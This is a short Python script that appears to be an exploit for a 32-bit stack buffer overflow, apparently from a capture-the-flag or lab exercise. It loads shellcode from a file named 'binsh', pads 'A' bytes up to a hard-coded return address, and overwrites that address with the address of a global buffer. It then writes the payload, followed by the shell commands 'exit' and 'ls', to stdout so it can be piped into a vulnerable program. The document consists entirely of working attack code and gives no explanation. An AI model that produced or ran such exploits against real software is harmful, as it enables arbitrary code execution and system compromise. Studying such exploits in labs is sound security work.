
import struct
import sys
import time

gBuf = 0x0804A060
bufAddr = 0xffffd518
retAddr = 0xffffd58c

sc = open('binsh', 'rb').read()

payload = 'A'*(retAddr-bufAddr) + struct.pack("<I", gBuf)

sys.stdout.write(sc+'\n')
# sys.stdout.flush()

sys.stdout.write(payload+'\n')
# sys.stdout.flush()

sys.stdout.write('exit\n')
sys.stdout.flush()

sys.stdout.write('ls')

